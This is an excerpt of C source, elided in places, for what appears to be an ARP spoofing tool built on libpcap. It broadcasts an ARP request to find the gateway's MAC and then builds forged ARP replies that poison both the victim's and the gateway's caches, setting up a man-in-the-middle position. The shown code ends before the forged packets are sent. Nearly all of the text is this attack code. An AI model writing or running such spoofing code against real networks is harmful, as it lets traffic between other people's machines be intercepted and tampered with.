...
int main(int argc, char *argv[]){
	...
	u_char gateway_packet[1500];
	u_char gateway_attacker_packet[1500];
	const u_char *p;
	arp_hdr arphdr, attacker_arphdr, gateway_arphdr, gateway_attacker_arphdr;
	...
	if(argc != 4){
		perror("Check argument! (./test_v5 <interface> <sender ip> <target_ip>\n");
		return 2;
	}
...
// ARGV[1]
	...
	//////////////////////////////////////////
	memset(gateway_packet, 0, sizeof(gateway_packet));
	struct ether_header* gateway_ether_hdr = (struct ether_header *)gateway_packet;
	gateway_ether_hdr->ether_type = htons(ETHERTYPE_ARP);
	int i;
	for(i=0; i<6; i++){ //to broadcast and get sender's arp address
		...
		/////////////////////////////////
		gateway_ether_hdr->ether_dhost[i]=0xff;
		gateway_ether_hdr->ether_shost[i] = src_mac[i];
		gateway_arphdr.sender_mac[i] = src_mac[i];
		gateway_arphdr.target_mac[i] = 0x00;
	...
	///////////////////////////////////////////
	gateway_arphdr.htype = htons(1);
	gateway_arphdr.ptype = htons(ETH_P_IP);
	gateway_arphdr.hlen = 6;
	gateway_arphdr.plen = 4;
	gateway_arphdr.opcode = htons(1); //ARP Request for Gateway
	...
	for(i =0; i<4; i++){
		...
		gateway_arphdr.sender_ip[i] = src_ip[i];
		printf("sender_ip: %d", gateway_arphdr.sender_ip[i]);
		printf("\n");
		gateway_arphdr.target_ip[i] = gate_ip[i];
		printf("gateway_ip: %d", gateway_arphdr.target_ip[i]);
		printf("\n");
	}
	...
	if(pcap_sendpacket(handle, gateway_packet, 42) != 0)
	{
	...
	////////////////////////////////////////////////////////////////////////////////////
	struct ether_header* gateway_attacker_ether = (struct ether_header *)gateway_attacker_packet;
	////////////////////////////////////////////////////////////////////////

	attacker_ether->ether_type = htons(0x0806);
	//////////////////////////////////////////////
	gateway_attacker_ether->ether_type = htons(0x0806);

	for(i=0; i<6; i++){
		attacker_ether->ether_dhost[i] = dst_mac[i];
		attacker_arphdr.target_mac[i] = dst_mac[i];
		////////////////////////////////////////////////////
		gateway_attacker_ether->ether_dhost[i] = dst_mac[i];
		gateway_attacker_arphdr.target_mac[i] = dst_mac[i];

	}
	printf("gateway_attacker's mac: ");
	for(i=0; i<6; i++){
		attacker_ether->ether_shost[i] = src_mac[i];
		attacker_arphdr.sender_mac[i] = src_mac[i];

		//////////////////////////////////////////////
		gateway_attacker_ether->ether_shost[i] = src_mac[i];
		gateway_attacker_arphdr.sender_mac[i] = src_mac[i];
		printf("%0.2x", gateway_attacker_arphdr.sender_mac[i]);
		printf("");
	}
	...
	/////////////////////////////////////////////
	gateway_attacker_arphdr.htype = htons(1);
	gateway_attacker_arphdr.ptype = htons(ETH_P_IP);
	gateway_attacker_arphdr.hlen = 6;
	gateway_attacker_arphdr.plen = 4;
	gateway_attacker_arphdr.opcode = htons(2); //Gateway reply

	for(i=0; i<4; i++){
			attacker_arphdr.sender_ip[i] = gate_ip[i];
			attacker_arphdr.target_ip[i] = dst_ip[i];
			//here gateway ip configuration
			printf("%d\n", attacker_arphdr.target_ip[i]);
			gateway_attacker_arphdr.sender_ip[i] = dst_ip[i];
			gateway_attacker_arphdr.target_ip[i] = gate_ip[i];
			printf("gateway_attacker's target ip: %d\n", gateway_attacker_arphdr.target_ip[i]);
	}
	...
	///////////////////////////////////////////////////////////////////////////////
	memcpy(gateway_attacker_packet, gateway_attacker_ether, sizeof(gateway_attacker_ether));
	memcpy(gateway_attacker_packet + 14, &gateway_attacker_arphdr, sizeof(gateway_attacker_arphdr));
	
	//printf("gateway attacker packet hex: ");
